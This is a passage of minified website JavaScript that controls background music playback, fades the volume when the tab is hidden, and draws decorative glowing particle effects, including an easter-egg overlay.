e=document.getElementById("bgmAudio"),t=document.getElementById("logoContainer"),o=document.getElementById("logo");if(b)b=!1,e.pause(),t.classList.remove("playing","activity","heavy-beats"),A("paused"),o.style.transform="",o.style.animation="",L=!1,M=!1,H=[],requestAnimationFrame(()=>{ft(),B&&C&&C.postMessage({type:"stop"})});else{if(!v&&!Vt()){A("initial");return}v.state==="suspended"&&v.resume(),e.play().then(()=>{b=!0,t.classList.add("playing"),A("playing"),document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),pt()}).catch(n=>{A("initial")})}}function oe(){let e=document.getElementById("logoContainer"),t=document.getElementById("logo");b=!1,e.classList.remove("playing","activity","heavy-beats"),t.style.transform="",t.style.animation="",L=!1,M=!1,H=[],T&&T.setAttribute("width","0"),requestAnimationFrame(()=>{ft()}),A("initial")}document.addEventListener("DOMContentLoaded",function(){nt(),ot();let e;window.addEventListener("resize",()=>{clearTimeout(e),e=setTimeout(()=>{ot()},300)});let t=document.getElementById("logoContainer"),o=document.getElementById("bgmAudio");t&&o&&(zt(),_t(),t.addEventListener("click",ee),o.addEventListener("ended",oe),A("initial")),o&&(o.volume=1,o.loop=!0)});document.addEventListener("visibilitychange",function(){let e=document.getElementById("bgmAudio");if(document.hidden&&b){let t=e.volume,o=.15,n=600,i=20,s=(t-o)/i,a=n/i,c=0,r=setInterval(()=>{c++,e.volume=Math.max(o,t-s*c),c>=i&&(clearInterval(r),e.volume=o)},a)}else if(!document.hidden&&b){let t=e.volume,o=1,n=350,i=20,s=(o-t)/i,a=n/i,c=0,r=setInterval(()=>{c++,e.volume=Math.min(o,t+s*c),c>=i&&(clearInterval(r),e.volume=o)},a)}});function ne(){let e=Date.now();if(document.querySelector(".tech-particle-burst")||e-U<Ht)return;U=e;let t=document.createElement("div");t.className="tech-particle-burst",document.body.appendChild(t);let n=document.getElementById("mainFooter").getBoundingClientRect(),i=n.top,s=n.left,a=n.width,r=window.innerWidth<768?12:18;for(let l=0;l<r;l++){let d=document.createElement("div");d.className="tech-particle";let m=s+Math.random()*a,g=i+Math.random()*8;d.style.left=m+"px",d.style.top=g+"px",d.style.animationDelay=Math.random()*.4+"s";let p=2+Math.random()*3;d.style.width=p+"px",d.style.height=p+"px";let k=["#00e4ff","#00a2ff","#66ccff","#0099ff","#007acc","#4a90e2"],h=k[Math.floor(Math.random()*k.length)];d.style.background=h,d.style.boxShadow=`0 0 8px ${h}, 0 0 16px ${h}80`;let X=(Math.random()-.5)*20;d.style.setProperty("--horizontal-offset",X+"px"),t.appendChild(d)}setTimeout(()=>{t.parentNode&&t.parentNode.removeChild(t)},1500)}var j=null,w=null;function se(){ht(),w=document.createElement("div"),w.className="easter-egg-particle-container",w.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1002;
        overflow: hidden;
    `,document.body.appendChild(w),j=setInterval(()=>{ie()},800)}function ht(){j&&(clearInterval(j),j=null),w&&(w.parentNode&&w.parentNode.removeChild(w),w=null)}function ie(){if(!w)return;let e=document.createElement("div");e.className="easter-egg-particle";let t=Math.random()*window.innerWidth,o=window.innerHeight-Math.random()*20;e.style.left=t+"px",e.style.top=o+"px";let n=(Math.random()-.5)*40;e.style.setProperty("--horizontal-offset",n+"px");let i=1.5+Math.random()*2.5;e.style.width=i+"px",e.style.height=i+"px";let s=["#00e4ff","#00a2ff","#66ccff","#0099ff","#33bbff","#00ccff"],a=s[Math.floor(Math.random()*s.length)];e.style.background=a,e.style.boxShadow=`0 0 4px ${a}, 0 0 8px rgba(0, 228, 255, 0.3)`,e.style.animation="easterEggParticleFloat 6s ease-out forwards",w.appendChild(e),setTimeout(()=>{e.parentNode&&e.parentNode.removeChild(e)},6e3)}})();
